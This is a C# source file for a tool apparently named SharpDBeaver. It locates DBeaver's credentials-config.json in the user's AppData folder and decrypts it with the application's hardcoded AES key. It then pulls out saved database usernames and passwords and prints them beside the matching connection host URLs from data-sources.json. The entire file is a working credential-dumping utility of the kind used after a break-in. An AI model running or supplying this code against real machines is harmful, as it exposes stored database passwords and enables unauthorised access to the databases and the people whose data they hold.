using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace SharpDBeaver
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string config = "";
                string sources = "";
                foreach (var entry in args.Select((value, index) => new { index, value }))
                {
                    string argument = entry.value.ToUpper();

                    switch (argument)
                    {
                        case "-C":
                        case "/C":
                            config = args[entry.index + 1];
                            break;
                        case "-S":
                        case "/S":
                            sources = args[entry.index + 1];
                            break;
                    }
                }
                if (args == null || !args.Any())
                {
                    sources = GetAppDataFolderPath() + "\\DBeaverData\\workspace6\\General\\.dbeaver\\data-sources.json";
                    ConnectionInfo(Decrypt(GetAppDataFolderPath() + "\\DBeaverData\\workspace6\\General\\.dbeaver\\credentials-config.json", "babb4a9f774ab853c96c2d653dfe544a", "00000000000000000000000000000000"), sources);
                }
                else if (!string.IsNullOrEmpty(sources) && !string.IsNullOrEmpty(config))
                {
                    ConnectionInfo(Decrypt(config, "babb4a9f774ab853c96c2d653dfe544a", "00000000000000000000000000000000"), sources);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }

        public static void ConnectionInfo(string config, string sources)
        {
            string pattern = @"\""(?<key>[^""]+)\""\s*:\s*\{\s*\""#connection\""\s*:\s*\{\s*\""user\""\s*:\s*\""(?<user>[^""]+)\""\s*,\s*\""password\""\s*:\s*\""(?<password>[^""]+)\""\s*\}\s*\}";
            MatchCollection matches = Regex.Matches(config, pattern);
            foreach (Match match in matches)
            {
                string key = match.Groups["key"].Value;
                string user = match.Groups["user"].Value;
                string password = match.Groups["password"].Value;
                MatchDataSource(File.ReadAllText(sources), key);
                Console.WriteLine($"username: {user}");
                Console.WriteLine($"password: {password}");
                Console.WriteLine();
            }
        }

        public static void MatchDataSource(string json, string jdbcKey)
        {
            string pattern = $"\"({Regex.Escape(jdbcKey)})\":\\s*{{[^}}]+?\"url\":\\s*\"([^\"]+)\"[^}}]+?}}";
            Match match = Regex.Match(json, pattern);
            if (match.Success)
            {
                string url = match.Groups[2].Value;
                Console.WriteLine($"host: {url}");
            }
            else
            {
                Console.WriteLine($"No matching connection found for {jdbcKey}");
            }
        }

        public static string GetAppDataFolderPath()
        {
            string appDataFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            return appDataFolderPath;
        }
        public static string Decrypt(string filePath, string keyHex, string ivHex)
        {
            byte[] encryptedBytes = File.ReadAllBytes(filePath);
            byte[] key = StringToByteArray(keyHex);
            byte[] iv = StringToByteArray(ivHex);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream memoryStream = new MemoryStream(encryptedBytes))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(cryptoStream, Encoding.UTF8))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }
        private static byte[] StringToByteArray(string hex)
        {
            int numberChars = hex.Length;
            byte[] bytes = new byte[numberChars / 2];
            for (int i = 0; i < numberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return bytes;
        }
    }
}
